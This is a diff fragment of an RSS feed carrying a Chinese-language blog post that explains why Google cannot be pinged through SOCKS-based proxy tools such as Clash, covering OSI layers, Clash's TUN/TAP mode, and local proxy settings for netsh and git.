+&lt;/h2&gt;&lt;h3 id=&#34;1vpn-1&#34;&gt;1.VPN
+&lt;/h3&gt;&lt;p&gt;虚拟私有网络，最早应用于一些大公司中，因私密通信的需求而产生，是一种端对端的虚拟私有专线，可避免通讯流量被中间人劫持。&lt;/p&gt;
+&lt;p&gt;也就是说，访问谷歌能只是VPN刚好可以做到的，人家本来没想要干这个，而且VPN流量特征明显，早就可以被 GFW 完美探测并封锁。&lt;/p&gt;
+&lt;p&gt;只有申请报备的企业用户才可正常使用VPN，比如科研机构，大型企业之类的。&lt;/p&gt;
+&lt;p&gt;顺便吐槽一下，我手机里以前那些免费加速器基本都属于这种。&lt;/p&gt;
+&lt;h3 id=&#34;2shadowsocks-及衍生品&#34;&gt;2.Shadowsocks 及衍生品
+&lt;/h3&gt;&lt;p&gt;该类软件利用本地服务器加密流量，然后将加密流量发送至远程服务器解密。&lt;/p&gt;
+&lt;p&gt;常见的应用软件有 Shadowsocks、ShadowsocksR、Shadowrocket、V2Ray、Clash、Surge。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;clash&lt;/strong&gt;是使用 GO 开的发一个基于规则的隧道代理软件，支持 HTTP/HTTPS/SOCKS/Shadowsocks/ShadowsocksR/V2Ray/Trojan 协议, 能更好的使用处理规则（就是你规定它该连啥）&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 200; 
+			flex-basis: 480px&#34;
+	&gt;
+	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download.png&#34; data-size=&#34;318x159&#34;&gt;
+		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download.png&#34;
+			width=&#34;318&#34;
+			height=&#34;159&#34;
+			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download_hu109ae194a1ca4c8a912d470a5f6e0278_2842_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download_hu109ae194a1ca4c8a912d470a5f6e0278_2842_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;download&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;download&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;硬件方向&#34;&gt;硬件方向
+&lt;/h2&gt;&lt;h3 id=&#34;1路由&#34;&gt;1.路由
+&lt;/h3&gt;&lt;p&gt;没错！&lt;/p&gt;
+&lt;p&gt;将上面的软件部署在了路由器上，连接路由器的设备都可以通过路由器访问到谷歌。&lt;/p&gt;
+&lt;p&gt;很不错的想法，但是遗憾的是大部分路由器在设计的时候算力只能满足基本的路由功能，而在通信产生大量的加解密运算，路由器算不过来，网就卡了……&lt;/p&gt;
+&lt;p&gt;接着往下看，还有更好的方法。&lt;/p&gt;
+&lt;h3 id=&#34;2-软路由&#34;&gt;2. 软路由
+&lt;/h3&gt;&lt;p&gt;新主意，利用台式机或服务器配合软件形成路由解决方案，主要靠软件的设置，达成路由器的功能。这样既有《全局代理》的效果，又有足够的算力。&lt;/p&gt;
+&lt;p&gt;但是缺点。。。比较麻烦。。。
+接着往下看，还有更好的方法。&lt;/p&gt;
+&lt;h3 id=&#34;3网关模式&#34;&gt;3.网关模式
+&lt;/h3&gt;&lt;p&gt;通过一台计算机上跑的软件来实现路由器功能，代表性产品：Windows 下的 Clash，Mac 下的 Surge。&lt;/p&gt;
+&lt;p&gt;相当于在本地局域网里部署了一个开启Clash或Surge的电脑当网关，任何在局域网内的设备都可以将此网关作为代理，访问互联网。&lt;/p&gt;
+&lt;p&gt;这样有几个好处，一是效率高，方便；二是便于集中管理。&lt;/p&gt;
+&lt;h1 id=&#34;why-not-二&#34;&gt;why not （二）
+&lt;/h1&gt;&lt;p&gt;讲了这么多，还是不知道为什么不能ping到google。&lt;/p&gt;
+&lt;p&gt;其实原因很简单，&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;SOCKS协议在会话层 (第五层)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;ICMP协议在网络层(第三层)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;而ping用的是ICMP协议。&lt;/p&gt;
+&lt;p&gt;众所周知：前朝的剑斩不了本朝的官。
+我拿上层的协议，去代理下层的服务？&lt;/p&gt;
+&lt;p&gt;而我们之所以能够访问google是因为使用http协议，在&lt;strong&gt;应用层(第七层)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 177; 
+			flex-basis: 426px&#34;
+	&gt;
+	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1.png&#34; data-size=&#34;1277x719&#34;&gt;
+		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1.png&#34;
+			width=&#34;1277&#34;
+			height=&#34;719&#34;
+			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1_hu27d5c098c017076f48d4293e7e33a2ab_488644_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1_hu27d5c098c017076f48d4293e7e33a2ab_488644_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;1&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;1&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;how二&#34;&gt;how（二）
+&lt;/h1&gt;&lt;p&gt;于是我们来解决这个问题，怎么ping到google？&lt;/p&gt;
+&lt;p&gt;这里clash有个很好的功能，虚拟网卡。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;TUN&lt;/strong&gt;与&lt;strong&gt;TAP&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在计算机网络中，&lt;strong&gt;TUN&lt;/strong&gt;与&lt;strong&gt;TAP&lt;/strong&gt;是操作系统内核中的虚拟网络设备。不同于普通靠硬件网络适配器实现的设备，这些虚拟的网络设备全部用软件实现，并向运行于操作系统上的软件提供与硬件的网络设备完全相同的功能。&lt;/p&gt;
+&lt;p&gt;TAP等同于一个以太网设备，它操作第二层数据包如以太网数据帧。TUN模拟了网络层设备，操作第三层数据包比如IP数据包。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 111; 
+			flex-basis: 268px&#34;
+	&gt;
+	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12.png&#34; data-size=&#34;201x180&#34;&gt;
+		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12.png&#34;
+			width=&#34;201&#34;
+			height=&#34;180&#34;
+			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12_hufdca2f5e6053cff671745b6bf7dba609_145229_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12_hufdca2f5e6053cff671745b6bf7dba609_145229_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;12&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;12&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;如图，被涂掉的网络是正常连的wifi，而下面的网络 3就是clash生成的虚拟网卡，就是这么神奇，clash的TAP 模式。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 139; 
+			flex-basis: 333px&#34;
+	&gt;
+	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11.png&#34; data-size=&#34;448x322&#34;&gt;
+		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11.png&#34;
+			width=&#34;448&#34;
+			height=&#34;322&#34;
+			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11_hu06809faec8021013e9d23dbf4a94042b_14668_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11_hu06809faec8021013e9d23dbf4a94042b_14668_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;11&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;11&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;这样，我们就ping通google了。&lt;/p&gt;
+&lt;p&gt;回到我最开始的目的，要更新github pages，就被轻而易举的解决了。&lt;/p&gt;
+&lt;p&gt;但是还有其他的方法吗？&lt;/p&gt;
+&lt;p&gt;有的。&lt;/p&gt;
+&lt;p&gt;更改powershell的代理（要管理员权限）或者git的代理。（git以后会讲）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell设置代理
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netsh winhttp set proxy 127.0.0.1:7890
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;取消代理
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netsh winhttp reset proxy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;查看代理
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netsh winhttp show proxy
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git全局代理
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global http.proxy http://127.0.0.1:7890
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global https.proxy http://127.0.0.1:7890
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git取消全局代理：
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global --unset http.proxy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global --unset https.proxy
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;7890是我的默认代理端口&lt;/p&gt;
+&lt;p&gt;这样直接输代码肯定比之前name一大堆简单的多，可是为什么这样修改之后可以上传github pages却不能ping google呢？&lt;/p&gt;
+&lt;p&gt;原因很明显，就是git和windows powershell 在osi模型上的层数在第三层之上，修改他们的代理也无法代理ICMP协议，也就ping不了google。但是连接github pages却用的更上层的协议。&lt;/p&gt;
+&lt;h1 id=&#34;最后&#34;&gt;最后
+&lt;/h1&gt;&lt;p&gt;最后再解释几个名词&lt;/p&gt;
+&lt;p&gt;机场：提供特殊的、以私密方式上网的服务商（或平台）。&lt;/p&gt;
+&lt;p&gt;VPS：Virtual Private Server
+是将一台服务器分割成多个虚拟专用服务器的服务。&lt;/p&gt;
+&lt;p&gt;可以这么理解，一些专业的人建立了很多VPS来付费（或免费）提供服务，这样你就不用再辛苦从外面买一台主机当做服务端了，用人家配好的就能直接访问谷歌。&lt;/p&gt;
+&lt;p&gt;这些VPS放到一起，就变成了一个机场，可以供用户切换线路，找到不同的服务端。&lt;/p&gt;
+&lt;p&gt;ps：想了解更多的推荐去看前面推荐的视频。&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
 </rss>
